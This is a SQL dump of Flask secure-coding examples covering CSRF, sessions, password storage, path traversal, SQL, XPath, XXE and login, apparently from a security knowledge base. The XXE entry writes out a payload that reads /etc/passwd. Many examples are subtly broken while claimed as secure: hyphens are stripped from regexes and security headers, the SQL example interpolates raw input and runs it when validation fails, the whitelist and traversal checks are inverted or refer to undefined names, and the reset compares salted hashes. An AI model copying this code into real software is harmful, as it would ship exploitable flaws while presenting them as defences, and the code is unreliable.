        beforeSend: function(xhr, settings) {
            if (!/^(GET|HEAD|OPTIONS|TRACE)$/i.test(settings.type) && !this.crossDomain) {
                xhr.setRequestHeader("XCSRFToken", csrf_token);
            }
        }
    });
    </script>

	//For configuring in the backend, you can use the below code
    import base64
    from OpenSSL import SSL, rand
    from werkzeug.utils import secure_filename
    from flask_wtf.csrf import CSRFProtect, CSRFError

	//Initialize the flask application 
    app = Flask(__name__)

    //To Register CSRF protection globally for the app 
    csrf = CSRFProtect()
    csrf.init_app(app)

    //Configurations 
    //Strictly protection on SSL, Referrer 
    app.config[''WTF_CSRF_SSL_STRICT''] = True 

    
    //Always use a WTF_CSRF_SECRET_KEY otherwise by default this will use the Flask app''s 
    //SECRET_KEY. So if user didn''t WTF_CSRF_SECRET_KEY it will choose SECRET_KEY, 
    //Which may impact the secret key

    //Random string for generating CSRF token
    app.config[''WTF_CSRF_SECRET_KEY''] = base64.b64encode(rand.bytes(128)) 

    //Function which is called when CSRF error happens
    @app.errorhandler(CSRFError)
    def handle_csrf_error(e):
        return render_template(''csrf_error.html'', reason=e.description), 400
	', 'CSRF tokens', 'flask'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Logout function


 Example:


    from flask_login import login_user, LoginManager, UserMixin, logout_user, login_required

    """
    This way, the logout functionality will revoke the complete session:
    """
  
    @app.route("/logout")
    @login_required
    def logout():
      logout_user()
      setLog(self.userId,"Logout User", "SUCCESS", datetime.utcnow(), "NULL")
      return render_template(''index.html'')', 'Logout function', 'flask'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Whitelisting


 Example:


    """
    First we create a function which checks the allowed patterns:
    whitelisting("value1,value2,value3" , input)
    Whitelisting is checking if a value is identically the same as the whitelist we created. Please rewrite the below part to reflect this.
    """

    def whitelisting(allowed, input):
        result = allowed.split('','')
        flag = False
        for x in result:
            if x == match:
            
            //If the value is valid we send a log to the logging file
            setLog(session["id"], "Good whitelist validation", "SUCCESS", datetime.utcnow(),"HIGH")
            flag = True
            //Whenever there was a valid match we return true
            return True
            
        //Check for a false in order to send error to log and counter the user
        if flag == False:
                
            //If the whitelist is bad log the validation 
            setLog(session["id"], "Bad whitelist validation", "FAIL", datetime.utcnow(), "HIGH")            
            counter.increment()
            return False    
', 'White listing', 'flask'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Session hijacking and fixation


 Example:


    """
    As soon as a user logs into your application you must store his session id as well as his
    IP address along with his userID. This information will be used later on in your application in order to identify possible session hijacking.

    TABLE track_sessions
    
    | TrackID | userID |		   	   SESSION 		            |     Ip address	    |
    
    |   1     | 1      | 	79dcd529c0f5e01a9bfb2425c52036c6    |	123.45.67.89	|   
    
    |   2     | 1      | 	79dcd529c0f5e01a9bfb2425c52036c6    |	123.45.67.81	|
    
    |   3     | 2      | 	c80959d3ea4c166413774e45375ac2a1    |	987.65.43.21	|
    

    In order to prevent session hijacking there are a couple of defense strategies
    which combined are a hardened defense.  
    """

    """
    First we implement the strict transport security header, this is in order to prevent
    users from accessing your application over an unprotected connection.
    """

    //Example of the strict transport security header:
    response.headers["StrictTransportSecurity"] = "maxage=31536000"

    //If all present and future subdomains will be HTTPS:
    response.headers["StrictTransportSecurity"] = "maxage=31536000; includeSubDomains"    

    """
    Recommended: If the site owner would like their domain to be included in the HSTS preload
    list maintained by Chrome (and used by Firefox and Safari), then use:
    """

    response.headers["StrictTransportSecurity"] = "maxage=31536000; includeSubDomains; preload"    

    """
    The `preload` flag indicates the site owner''s consent to have their domain preloaded.
    The site owner still needs to then go and submit the domain to the list. the preload list
    enforces the browser to always present your application on HTTPS even on the first time
    the user hits your application
    """

    """
    Then we set the httpOnly flag
    (see "HttpOnly" in the code examples for more details about implementation)
    """
    	
    app.config[''SESSION_COOKIE_HTTPONLY''] = True

    """
    Then we set the flag for session timeout
    (see "Timeout" in the code examples for more details about implementation)
    """
    	
    app.config[''PERMANENT_SESSION_LIFETIME''] = 3600

    """
    Then we set the session secure flag
    (see "Secure flag" in the code examples for more details about implementation)
    """
    app.config[''SESSION_COOKIE_SECURE''] = True

    """
    On login we change the session id in order to prevent session fixation
    (see "Login functionality" in the code examples for more details about implementation)
    """
    
    //In header we should include this
    from flask_kvsession import KVSessionExtension
    
    //Call for session regenerate to prevent session fixation
    session.regenerate()

    """
    NOTE: On applications that require high level security, there should never be an
    remember me functionality implemented.
    """


    """
    Now imagine the scenario after the login of the user (see the "login functionality" in
    the code examples for more details). Whenever the user is logged in, the users IP address
    and session id are also stored in the database these values are used in order to verify
    if there are multiple users active on the same session.
    If so, we can let the user decide to terminate the session and terminate the
    other assigned sessions.
    """

    def checkSession():
        //To check whether the user is active
        if session[''status''] != "active" or session[''status''] == "":
            return redirect(url_for(''login''))

        """
        Then we start the rest of the function where we will check if there are multiple
        users/IP addresses using the same session id
        """
    
        //Store the current session
        session = request.cookies.get(''session'')

        //Get user ip address
        ipaddress = request.remote_addr

        trackSession = track_sessions.query.filter_by(ipaddress = ipaddress).first()
        if trackSession.session == ipaddress:
            return """<div style=''borderstyle:solid; bordercolor:black; color:white; backgroundcolor:red; float:left;''>
                <p>There are other active sessions on other IPaddresses.<br/>
                Your session could be hijacked press logout in order to authenticate again
                for security reasons!
                <br/><br/>
                <a href=''/logout''>Terminate sessions</a>
                <br/>
                <a href=''/Proceed''>Proceed anyway</a>
                </p>
                </div>"""

    """
    The only thing left to do now is to update your track_sessions table by inserting
    the IP address, sessionID and userID if you want to accept the other sessions as valid.
    Otherwise the user just has to terminate his current session in order to lock out the
    other sessions.
    """', 'Session hijacking and fixation', 'flask'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Random password/token generation


 Example:


	"""
	When needing to generate random numbers, always use proven methods 
	instead of writing your own.
	"""
	
	//Return a 50 character random string usable as a SECRET_KEY setting value.
	from django.core.management.utils import get_random_secret_key
	SECRET_KEY = get_random_secret_key()
	
	//Generate an even longer random string usable as a SECRET_KEY setting
	from django.utils.crypto import get_random_string
	chars = ''abcdefghijklmnopqrstuvwxyz0123456789!@$%^&*(_=+)''
	SECRET_KEY = get_random_string(100, chars)
    
', 'Random password token generation', 'flask'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Password storage (salting/stretching/hashing)


 Example:


    from flask.ext.bcrypt import Bcrypt

    //Initialize the application with Bcrypt
	app = Flask(__name__)
	bcrypt = Bcrypt(app)

	//For the encryption of passwords we use BCRYPT encryption method.

	def createHash(pwd):
		setLog(0, "Create password Hash", "SUCCESS", str(datetime.utcnow()), "HIGH")
		return bcrypt.generate_password_hash(pwd)

	//Validate your password

	def ValidatePassword(pwd_hash, pwd):
		setLog(0, "Start ValidatePassword", "SUCCESS", str(datetime.utcnow()), "HIGH")
		try:
			return bcrypt.check_password_hash(pwd_hash, pwd)
			setLog(0, "ValidatePassword correct password", "SUCCESS", str(datetime.utcnow()), "HIGH")
		except ValueError:
			return False
			setLog(0, "ValidatePassword incorrect password", "FAIL", str(datetime.utcnow()), "HIGH")

		', 'Password storage (salting stretching hashing)', 'flask'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Directory/path traversal


 Example:


	//Define the whitelist pattern and validation type and input parameter like:
	//getFiles("images,css,js", ''alphanumeric'', foldername)

	def getFiles(whiteListPattern, validationType, inputParameter):
		
		continue = True

		//First, we want to filter the filenames for expected values. For this example we use only az/09 and .
		//Whenever the values are tampered with, we can assume an attacker is trying to inject malicious input.
		//For more information about validation see "input validations" in the code examples:

		if inputValidation(inputParameter, validationType, "Invalid userinput", "HIGH") == False:
			continue = False

		//Second, we want to whitelist the filenames for expected values, in this example they are,
		//page1,page2 etc.. for more information about whitelisting see "whitelisting" in the code examples:

		//Check for filename Whitelisting
		if whitelisting(whiteListPattern, inputParameter):
			continue = False

		if continue == True:
			//Create Path
			path = os.path.join(app.config[''UPLOAD_FOLDER''], inputParameter)   
			images = []
			
			//List all the URL
			for f in os.listdir(path):
			    if f.endswith("jpg") or f.endswith("png"):
			        images.append("%s%s/%s" % (app.config[''UPLOAD_FOLDER''], inputParameter, f))

			return render_to_response(''gallery.html'', {''images'': images})

		else:

		 	return render_to_response(''gallery.html'', {''images'' : ''''})

	//gallery.html

    {% for image in images %}
    <img src=''{{image}}'' />
    {% endfor %}
', 'Directory path traversal', 'flask'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Input validation


 Example:

    
	"""
	This function is where you store all your input validation controls. 
	It makes it easy to maintain whenever you want to apply changes for 
	certain input validation roles and reduces the chance of mistakes in your regexes.
	"""

	def isAlphanumeric(str):
		match = re.findall("^[azAZ09]+$" , str)
		//Check for alphanumeric
		if match:
			return True
		else:
			return False

	def isAlpha(str):
		match = re.findall("^[azAZ]+$" , str)
		//Check for alpha
		if match:
			return True
		else:
			return False

	def isDigit(str):
		match = re.findall("^[09]+$" , str)
		//Check for isDigit
		if match:
			return True
		else:
			return False	

	def isBool(str):
	    match = re.findall("^(True|False)+$" , str)
		if match:
	        return True
	    else:
            return False	
    
	def inputValidation(input, type):
	    if type == alphanumeric:
	    	//Set the audit log
	    	setLog(session["id"], "Alphanumeric matched", "Success", str(datetime.utcnow()), session[''privilege''])
	    	return isAlphanumeric(input)
	   	elif type == numeric:
	   		//Set the audit log
	   		setLog(session["id"], "Numeric matched", "Success", str(datetime.utcnow()), session[''privilege''])
	   		return isDigit(input)
	   	elif type == alpha:
	   		//Set the audit log
	   		setLog(session["id"], "Alphabet matched", "Success", str(datetime.utcnow()), session[''privilege''])
	   		return isAlpha(input)
	   	elif type == bool:
	   		//Set the audit log
	   		setLog(session["id"], "Bool matched", "Success", str(datetime.utcnow()), session[''privilege''])
	   		return isBool(input)
	   	else:
	   		//Set the audit log
	   		setLog(session["id"], "FAIL", str(datetime.utcnow()), session[''privilege''])
	   		//Increment the counter
	    	counter.increment(1)
	   		return False
', 'Input validation', 'flask'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Enforce sequential step order (Shopping)


 Example:


    """
    Whenever an functionality consists out of following several steps to achieve some goal i.e,
    "User adds items to chart", "User enters shipping information", "User pays for goods",
    "Items will be shipped." You want to make sure the user can not skip the payment step in
    order to receive his goods.


    	    
    | Items  |	|  Cart	 |	|checkout |	 | CostumerInfo	|
    	  	 
    |itemID  |	|cartID  |	|PaymentID|  |ConsumerID    |
    |price	 |	|itemID  |	|itemID   |	 |name          |
    |name  	 |	|sessionID|	|Token    |	 |address	    |
    	  |sessionID|  |sessionID   	|
                            |Verified |  |consumerToken |
                            	 		

    As you can see above we have a very simplified database structure for your average
    web shop. Now we can walk through the different steps needed to enforce the user to take
    all steps before payment.

    We wont cover the entire shopping cart functions since that would become a rather big
    example so let''s cover the basics of enforcing the sequential steps.

    Step1: would be, the user adding items to his cart.

    Step2: would be, the user adding his items to checkout. Whenever he is done shopping
            "add to checkout" generates a random token for the added items which
            are inserted into the payment table in the database

    """

    def checkTokens():

        //First we build the checktokens function because we want to check the checkout tokens
        //Multiple times throughout the steps
    
        rows = checkout.query.filter_by(sessionID=session[''id'']).all()
        for x in rows:

            //Here we check for a different token or new session token
            if x.token == session[''token'']:

                customerinfo.query.filter_by(sessionID=session[''id'']).delete()
                db.session.commit()

                checkout.query.filter_by(sessionID=session[''id'']).delete()
                db.session.commit()

                return redirect(url_for(''checkout''))

    //As soon as the user visits your website you start sessions in order to assign sessionId

    """
    On submit we send al the shopping cart data to another table in the database, but
    this time al the items also contain the same random token. Now an attacker cannot sneak
    in new items since these tokens will be evaluated on the payment page.

    next, the user lands on a page where he has to fill in his customer info:

    NOTE: do not forget the CSRF token in order to prevent attackers from changing his
    shipping info.
    """

    //Then we proceed to check if the post values where not empty
    	
    check = True
    error = ""

    if request.method == ''POST'':
        if request.form[''customerName''] == "" : 
            check = False
            error += "Customer name is required"

        if request.form[''customerAddress''] == "":
            check = False
            error += "Customer address is required"

        if check != True:
            return error
        else:
            return redirect(url_for(''summary''))
            //In this step we also insert at the customer data into the database

    """        
    Then we select al the customer info and shopping items on sessionID from the
    database and display it on screen in order for the user to verify if all the
    information displayed is correct.
    """

    //When the user has verified we again check the checkout tokens to see if no new items where added
    checkTokens()    

    """
    After that the user verifies this information then he will be redirected to the payment
    page like ideal, Paypal etc.

    Whenever the payment returns true you set the "verified" column on the checkout
    table to TRUE and you send the customer the invoice and send him his items.
    """

    verified = True

    data = checkout.query.filter_by(sessionID=session[''id'']).first()
    data.verified = verified
    db.session.commit()

    customer = customer.query.filter_by(sessionID=session[''id'']).delete()
    db.session.commit()

    checkout = checkout.query.filter_by(sessionID=session[''id'']).delete()
    db.session.commit()

    cart = cart.query.filter_by(sessionID=session[''id'']).delete()
    db.session.commit()

    ', 'Enforce sequential step order shopping', 'flask'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' System commands


 Example:


	"""
	Define the whitelist pattern and validation type and input parameter like:
	command("data.txt,users.txt", "filename", filename)
	"""

	def command(whiteListPattern, validationType, inputParameter){

		continue = True

		"""
		Whenever a system command is finished, you should properly sanitize and escape this user input.
		System command functions examples are: system(), eval(), exec()

		First, we want to filter the filenames for expected values. For this example we use only az/09
		Whenever the values are tampered with, we can assume an attacker is trying to inject malicious input.
		for more information about validation see "input validations" in the code examples:
		"""

		if inputValidation(inputParameter, validationType) == False:
			continue = False

			"""
			Second, we want to whitelist the filenames for expected values, in this example they are,
			page1,page2 etc.. for more information about whitelisting see "whitelisting" in the code examples:
			"""

		if whitelisting(whiteListPattern, inputParameter) == False:
			continue = False

		//If all went good we include the filename
		if continue == True:

			//Even though there is match we still escape the shelx.quote():
			command = ''./configure {}'' .format(quote(inputParameter))
			os.system(command)

		else:

			return False', 'System commands', 'flask'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Session cookies HttpOnly


 Example:


	"""
	Whenever a session is started, the "httpOnly" option should always be set to "true" or "1":
	"""
	
	from flask import Flask, session

	//Initialize the flask application
	app = Flask(__name__)

	//Name of the session cookie
	app.config[''SESSION_COOKIE_NAME''] = ''hrj''

	//Path for the session cookie
	app.config[''SESSION_COOKIE_PATH''] = ''/''
	
	//Domain for the session cookie
	//Configure domains, do not use .yourdomain.com (wildcard)
	//This increases the attack surface!
	app.config[''SESSION_COOKIE_DOMAIN''] = ''demo.yourdomain.com''
	
	//Controls if the cookie should be set with the secure flag
	app.config[''SESSION_COOKIE_SECURE''] = True
	
	//Controls if the cookie should be set with the httponly flag
	app.config[''SESSION_COOKIE_HTTPONLY''] = True
	
	//Lifetime of a permanent session
	app.config[''PERMANENT_SESSION_LIFETIME''] = 3600

	//Store Value in session
	session[''type''] = "value"
', 'Session cookies HttpOnly', 'flask'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' SQL query


 Example:


    """
    SQLAlchemy is the Python SQL toolkit and Object Relational Mapper that gives application developers the full power and flexibility of SQL.
	"""

	from flask_sqlalchemy import SQLAlchemy
	
	//Will track modifications of objects and emit signals
	app.config[''SQLALCHEMY_TRACK_MODIFICATIONS''] = True
	//Database URI is used for connection
	app.config[''SQLALCHEMY_DATABASE_URI''] = ''sqlite:///test.db''
	//Create object of SQL Alchemy
	db = SQLAlchemy(app)

	//Class Model that is a declarative base which can be used to declare models
	class User(db.Model):
    	id = db.Column(db.Integer, primary_key=True)
    	username = db.Column(db.String(80), unique=True, nullable=False)
    	password = db.Column(db.String(120), unique=True, nullable=False)

    	def __repr__(self):	
        	return ''<User %r>'' % self.username

    
    //create the tables and database
    from yourapplication import db
	db.create_all()

	//Inserting data into the database  create, add and commit
	admin = User(username=''admin'', password=''9u3$$_m3_1f_y0u_C@n'')
	db.session.add(admin)
	db.session.commit()

	//Delete entries from the table
	db.session.delete(admin)
	db.session.commit()

	//Querying Records
	//Retrieve the user with username
	admin = User.query.filter_by(username=''admin'').first()
	admin.id

	//SQL raw string approach

	from sqlalchemy import text

	if inputValidation(inputParameter, ''alphanumeric'') == False:
		//Protection from string interpolation attack
		sql = text("select name from penguins where id =%s" % (inputParameter,) )
	
		result = db.engine.execute(sql)
		print result[0]', 'SQL query', 'flask'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Open forwards & redirects


 Example:

    
    """
    When using forwards & redirects you should make sure the URL is being explicitly
    declared in the code and cannot be manipulated by an attacker like example.com?page=dashboard :
    """

    redirect(url_for(''dashboard''))

    """
    Generally you should avoid getting input into the redirect which could contain
    userinput by any means. if for any reason this may not be feasible than you
    should make a whitelist input validation for the redirect like so:

    Example : 
    If the whitelisting list is home, upload and redirectParam is home 

    redirectParam = home
    redirecting("home,upload", redirectParam, "3")
    """


    def redirecting(whitelisting, input, count):
        
        """
        We want to whitelist the paged for expected values, in this example they are,
        page1,page2 etc.. for more information about whitelisting see "whitelisting" 
        in the code examples:
        """

        if whitelisting(whitelisting, input, count) == True:
            //Redirect the Input if whitelisting is correct
            redirect(url_for(input))


', 'Open forwards & redirects', 'flask'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Xpath query


 Example:


    """
    Define the allowed characters and input parameter and count level for the
    user lockout like:
    controller("<''>&", $_GET[''filename''], "3")
    
    In order to prevent xpath injections we have to treat these query''s similar as 
    to the sql query''s. 
    """
    
    def controller(allowed, input, count):
        
        """
        First we build our encoding method, see "input validation" code example for
        more detailed information about encoding and escaping.
        """
        
        return = encoder(allowed, input, count)

        //If the encoder came back false we do not process the function!

        if return != False:

            //Parse the register.xml
            root = etree.parse("register.xml")

            //Extract the id from the XML using XPath
            find = etree.XPath(''/Employees/Employee[ID='' + return + '']'')

            for x in find(root):
                print x.text
', 'X path query', 'flask'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Anticaching headers


 Example:


	"""
	Add the following headers to your application head in order to prevent the browser from caching
	"""

	@app.after_request
	def antiCaching(response):
		response.headers["CacheControl"] = "nostore, nocache, mustrevalidate" HTTP/1.1
		response.headers["CacheControl"] = "postcheck=0, precheck=0, false"
		response.headers["Pragma"] = "nocache"  HTTP/1.0
		return response
', 'Anti caching headers', 'flask'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Secure session cookies


 Example:


    """
    If you use SLL you can also make your cookies secure (encrypted) to 
    avoid "maninthemiddle" cookies reading
	"""

	from flask import Flask, session

	//Initialize the flask application
	app = Flask(__name__)

	//Set the secret key.  keep this really secret:
	app.secret_key = open("/dev/random","rb").read(32) 

	//Name of the session cookie
	app.config[''SESSION_COOKIE_NAME''] = ''hrj''
	
	//Path for the session cookie
	app.config[''SESSION_COOKIE_PATH''] = ''/''
	
	//Domain for the session cookie
	//Configure domains, do not use .yourdomain.com (wildcard)
	//This increases the attack surface!
	app.config[''SESSION_COOKIE_DOMAIN''] = ''demo.yourdomain.com''
	
	//Controls if the cookie should be set with the secure flag
	app.config[''SESSION_COOKIE_SECURE''] = True
	
	//Controls if the cookie should be set with the httponly flag
	app.config[''SESSION_COOKIE_HTTPONLY''] = True
	
	//Lifetime of a permanent session
	app.config[''PERMANENT_SESSION_LIFETIME''] = 3600

	//Store Value in session
	session[''type''] = "value"
', 'Secure session cookies', 'flask'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Crossdomain.xml


 Example:


		A bad example of a crossdomain.xml would be:

		<?xml version="1.0" ?>
		<crossdomainpolicy>
			<sitecontrol permittedcrossdomainpolicies="masteronly"/>
			<allowaccessfrom domain="*"/>
			<allowhttprequestheadersfrom domain="*" headers="*"/>
		</crossdomainpolicy>

		//Because it allows access from all other domains.
		//Instead of this approach you might want to use the following restrictions.
		//Example by twitter''s crossdomain.xml:

		<?xml version="1.0" encoding="UTF8"?>
		<crossdomainpolicy xmlns:xsi="http://www.w3.org/2001/XMLSchemainstance" xsi:noNamespaceSchemaLocation="http://www.adobe.com/xml/schemas/PolicyFile.xsd">
			<allowaccessfrom domain="twitter.com" />
			<allowaccessfrom domain="api.twitter.com" />
			<allowaccessfrom domain="search.twitter.com" />
			<allowaccessfrom domain="static.twitter.com" />
			<sitecontrol permittedcrossdomainpolicies="masteronly"/>
			<allowhttprequestheadersfrom domain="*.twitter.com" headers="*" secure="true"/>
		</crossdomainpolicy>
', 'Crossdomain.xml ', 'flask'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Password forget & Disallow old passwords


 Example:


    """
    Whenever you are developing a password forget function, these are the steps to follow
    in order to create hardened defenses.

    TABLE users
    
    | userID   | userName | password |   EmailAddress	 |  access  |
       
    |     1	   | Admin	  | Csdar323 | info@admin.com	 | 	 True   |
        	
    |	  2	   | User	  | Adf4fsv  | info@user.com     |   False  |
        
    |	  3	   | Guest	  | dff4fKr  | info@guest.com	 |	 True   |
        


    TABLE passwordForget
       
    | forgotPasswordID | 		Token 	    | 	UserID |   Active	|	  olPasswords	    |
    
    |      1  	 	   | c3ab8ff13720e....  |	  1	   | 	True	|	   Csdar323	      	|
    
    |	   2	 	   | 7dd39466b3c89....  |	  1	   | 	False   |		ef0c4f2         |
    
    |	   3	 	   | 83d4a3960714c....	|	  3	   | 	True	|		dff4fKr	        |
    


    As you can see we also store the old passwords into the password forget table, this
    we do in order to prevent the user from using old passwords later on in the process.

    Also use a cron job to make sure the generated tokens for the password reset are
    expire after a certain amount of time like 20 minutes.

    """

    def checkValidity(email):

        user = Members.query.filter_by(email=email).first()

        //Here we select the old password as well as the userid from the members table
        password = user.password
        userID = user.id
        email = user.email

        //If the select was not empty we will be sending an email to the user as well as 
        //Preparing the password forget function

        if user is None:
            """
            We show the user the same message in order to prevent the enumeration of
            valid email addresses.
            """
            return "An email was sent to your email for password reset"

        else:

            """
            Before we do anything we first set all other possible active statuses to NO
            in order to prevent an attacker creating a whole lot of tokens and than fuzz
            the password reset token.
            """

            active = False

            user.active = active
            db.session.commit()

            //Here we generate the password forget token
            token = base64.b64encode(rand.bytes(128))

            passwordChange = forgetPassword(token=token, userID=userID, active=active, oldPasswords=password)
            db.session.add(passwordChange)
            db.session.commit()            


    		//Here we send an email to the user with the needed reset function
    		msg = "follow this link to reset your password http://example.com/reset/"" + "token"
    		mail(email,"Password reset", msg)


    def resetPassword(resetLink, password):		

    	"""
    	Imagine the user clicked on his link with the token included and is redirected towards
    	the page where he can enter his new password.

    	Now we select the information from the forgot password function where the
    	forgot tokens matches the token in the database.
    	"""

    	active = True

        data = forgetPassword.query.join(members, forgetPassword.userID==members.userID).filter_by(token=resetLink,Active=active).all()

        //We select token and users id
        token = data.token
        userID = data.userID

        if token == resetLink:
            
            """
            First we pull the password through our function which enforces the input of
            secure passwords.(see "Enforce secure passwords" in code examples for more
            detailed information)
            """

            if checkPassword(password) == True:

                """
                Than we encrypt our password
                (see "Password storage" in code examples for more
                detailed information)    
                """

                newPassword = createHash(password)
    	
                """
                Finally we compare the password against other old passwords from the
                password reset database in order to prevent the user from using old passwords
                which could already be compromised by any means.
                """
    			
                user = forgetPassword.query.filter_by(userID=userID).first()

                if newPassword == user.oldPasswords:

                    return "This was an old password please do not use this password"

                else:
                    
                    //First we update the new password for the user
                    active = False

                    //Update the details
                    newUser = members.query.filter_by(userID=userID).first()
                    newUser.password = newPassword
                    db.session.commit()
                    user.active = active
                    user.userID = userID
    				db.session.commit()
', 'Password forget and disallow old passwords', 'flask'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' XML External entities


 Example:


	"""
	The overall prevention method for loading external entities is adding the following line of code:
	To be safe from loading external entities you have to turn off the entities in the parser.
	"""
	
	//If you are using lxml 

	content = ''''''<?xml version="1.0" encoding="UTF8"?>\
	<!DOCTYPE title [ <!ELEMENT title ANY >\
	<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>''''''

	"""
	If the dtd_validation = True and resolve_entities=True and if the attacker can control the
	XML file which is taken in the parser, he can read any file using the file protocol file:/// or use some other protocols like expect://, gopher:// to even get a shell        
	"""

	from lxml import etree
	
	//Both the entities and DTD are turned off
	parser = etree.XMLParser(dtd_validation=False ,resolve_entities=False)
	root = etree.XML("<root><a/><b></b></root>", parser)
	

	    


	    





	
', 'XML External entities', 'flask'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Anti clickjacking headers


 Example:

    
    """
    One way to defend against clickjacking is to include a ''framebreaker'' script in each
    page that should not be framed. The following methodology will prevent a webpage from
    being framed even in legacy browsers, that do not support the XFrameOptionsHeader.
    In the document HEAD element, add the following:
    First apply an ID to the style element itself:
    """

    <style id="antiClickjack">body{display:none !important;}</style>
    <! And then delete that style by its ID immediately after in the script >
    <script type="text/javascript">
      if (self === top) {
        var antiClickjack = document.getElementById("antiClickjack");
        antiClickjack.parentNode.removeChild(antiClickjack);
      } else {
        top.location = self.location;
      }
    </script>

    @app.after_request
    def clickjacking_Protection(response):
        """
        The second option is to use ''security headers''.
        There are two options for setting the ''anticlickjacking'' headers in
        your application:
        """

        //This will completely prevent your page from being displayed in an iframe 
        response.headers["XFrameOptions"] = "DENY"

        //This will completely prevent your page from being displayed in an iframe on other sites 
        response.headers["XFrameOptions"] = "SAMEORIGIN"
        return response
', 'Anti clickjacking headers', 'flask'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Debug Enabling


 Example:

    
    """
    Debug mode makes it a major security risk and therefore it must never be used on production machines. It may even lead to execution of arbitrary code.
    """

    //In Linux machines, never export the environment variable FLASK_DEBUG to 1
    $ export FLASK_DEBUG=0
    $ flask run

    //On Windows you need to use set instead of export
    $ set FLASK_DEBUG=0

    //Even with python you can enable debug mode
    app.debug = False

    //By default it is False
    app.run()', 'Debug enabling', 'flask'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Login functionality


 Example:


    """
    For privilege based authentication we need an extra table in your database in order to write the users privileges to.

    TABLE users
    
    | userID     | userName   | password | privilegeID   |    access	| 
       
    |   1        | Admin	  | Csdar323 |	  1		     | 	   TRUE		|
       	
    |	2	     | User		  | Adf4fsv  |	  2		     |	   FALSE	|
       
    |	3	     | Guest	  | dff4fKr  |	  3		     |	   TRUE		|
       

    TABLE privileges
     
    | privilegeID     | privilege        |
    
    |     1           | edit:read:delete |
    
    |	  2	          | edit:read		 |
    
    |	  3	          | read	         |
    

    Now instead of using roles in sessions we rather want to assign privileges to users
    by means of a DatabaseBased Authentication system.
    Now we can easily assign a user certain privileges for him to access.
    See "Privilege based authentication" code example for more information:
    We will be using flask_login module for login
    """

    from flask_login import login_user, LoginManager, UserMixin, logout_user, login_required

    //Instantiating Flask Login
    login_manager = LoginManager()
    login_manager.init_app(app)


    //Database model for User
    class User(db.Model):
        __tablename__ = "users"
        id = db.Column(''user_id'',db.Integer , primary_key=True)
        username = db.Column(''username'', db.String(20), unique=True , index=True)
        password = db.Column(''password'' , db.String(10))
        email = db.Column(''email'',db.String(50),unique=True , index=True)
        status = db.Column(''status'', db.String(50), index=True)
        registered_on = db.Column(''registered_on'' , db.DateTime)
        privilegeID = db.Column(''privilegeID'', db.Integer, db.ForeignKey(''privileges.id''))

        def __init__(self , username ,password , email, privilegeID, status):
            self.username = username
            self.password = password
            self.email = email
            self.registered_on = datetime.utcnow()
            self.privilegeID = privilegeID
            self.status = status


    //Login a user
    @app.route(''/login'', methods=[''GET'', ''POST''])
    def login():
        //Redirect to login page in GET request
        if request.method == ''GET'':
            return render_template(''login.html'')
        
        //Initializing username and password
        username = request.form[''inputName'']
        password = request.form[''inputPassword'']

        //Check whether the username is alphanumeric
        if inputValidation(''alphanumeric'', username) != True:
            setLog(0, "invalid expected input", "FAIL", str(datetime.utcnow()), "HIGH")
            return redirect(url_for(''login''))

        //Username and password check   
        registered_user = User.query.filter_by(username=username).first()
        if registered_user is None:
            flash(''Username or Password is invalid'' , ''error'')
            return redirect(url_for(''login''))

        //Validate the password hash on bycrypt
        elif ValidatePassword(registered_user.password, password):
            //Logged In successfully
            login_user(registered_user)
            flash(''Logged in successfully'')
        
        return render_template(''home.html'', user=request.form[''inputName''])
', 'Login functionality', 'flask'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' User registration / Sql truncation prevention


 Example:


    """
    In order to prevent Column truncation sql injection Solution we have to make sure the
    applications structural logic does not mismatches with the database structural logic.
    To achieve this imagine the follow example of a database structure of a users table

    TABLE users
    
    |	     *Name* 	   |	*Type* 		  |    *Extra*     |
    
    |        userID	       |    Int(11)       | AUTO_INCREMENT |
    
    |       Username  	   |    char(21)      |  		       |
    
    |       Password       |  Varchar(255)    |			       |
    
    |      PrivilegeID     |    Int(11)       | 	     	   |
       
    |      Status          |    Varchar(200)  |                |
    
    """

    class User(db.Model):
        __tablename__ = "users"
        id = db.Column(''user_id'',db.Integer , primary_key=True)
        username = db.Column(''username'', db.String(20), unique=True , index=True)
        password = db.Column(''password'' , db.String(10))
        email = db.Column(''email'',db.String(50),unique=True , index=True)
        status = db.Column(''status'', db.String(50), index=True)
        registered_on = db.Column(''registered_on'' , db.DateTime)
        privilegeID = db.Column(''privilegeID'', db.Integer, db.ForeignKey(''privileges.id''))
 
        def __init__(self , username ,password , email, privilegeID, status):
            self.username = username
            self.password = password
            self.email = email
            self.registered_on = datetime.utcnow()
            self.privilegeID = privilegeID
            self.status = status

    //Function to add the details to database
    def userRegister(username, password, email, privilegeID, status):
        user = User(username, password, email, privilegeID, status)
        db.session.add(user)
        db.session.commit()

    //Register user 
    @app.route(''/register'' , methods=[''GET'',''POST''])
    def register():
        if request.method == ''GET'':
            return render_template(''signup.html'')
        //Ensure the username is not long
        if len(request.form[''inputName''] >= 21):
            raise Exception("Long username")
        //Create password hash
        password = passwordHash(request.form[''inputPassword''])
        userRegister(request.form[''inputName''], password, request.form[''inputEmail''], 3, "Active")
        flash(''User successfully registered'')
        return redirect(url_for(''login''))        
